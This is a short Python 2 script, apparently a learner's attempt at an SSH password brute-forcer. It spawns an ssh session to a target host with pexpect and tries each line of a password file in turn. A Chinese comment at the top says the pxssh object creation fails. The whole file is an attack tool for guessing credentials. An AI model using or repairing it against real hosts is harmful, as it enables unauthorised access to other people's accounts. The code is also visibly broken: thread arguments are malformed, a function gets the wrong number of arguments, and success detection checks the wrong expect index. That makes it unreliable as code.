# coding=UTF-8#不知道哪里出了问题调用pxssh.pxssh()创建对象是失败的会抛出异常

import pexpect
import optparse
import time
import threading

maxConnections = 5
connection_lock =threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user):
 	global Found, Fails
 	try:
 		sh_newkey = 'are you sure you want to continue connecting'
		connStr='ssh '+user+'@'+host
		child=pexpect.spawn(connStr)
		return child
	except:
		print 'connect is wrong!'
def trypwd(ch,pwd):
	global Found
	ch.sendline(pwd)
	ret=ch.expect('#')
	if ret == 1:
		print pwd +'is the right password!'
		Found=True
def main():
 	parser = optparse.OptionParser('usage%prog '+'-H<target host> -u <user> -f <password list>')
	parser.add_option('-H', dest='tgtHost', type='string',help='specify target host')
 	parser.add_option('-f', dest='passwdFile', type='string',help='specify password file')
 	parser.add_option('-u', dest='user', type='string',help='specify the user')
 	(options, args) = parser.parse_args()
 	host = options.tgtHost
 	passwdFile = options.passwdFile
 	user = options.user
 	if host == None or passwdFile == None or user ==None:
 		print(parser.usage)
 		exit(0)
 	fn = open(passwdFile, 'r')
 	ch=connect(host,user)
 	for line in fn.readlines():
 		if Found:
 			print "[*] Exiting: Password Found"
 			exit(0)
 		#connection_lock.acquire()
		password = line.strip('\r').strip('\n')
		print("[-] Testing: " + str(password))
		t = threading.Thread(target=trypwd, args=(password))
		t.start()
if __name__=='__main__':
	main()
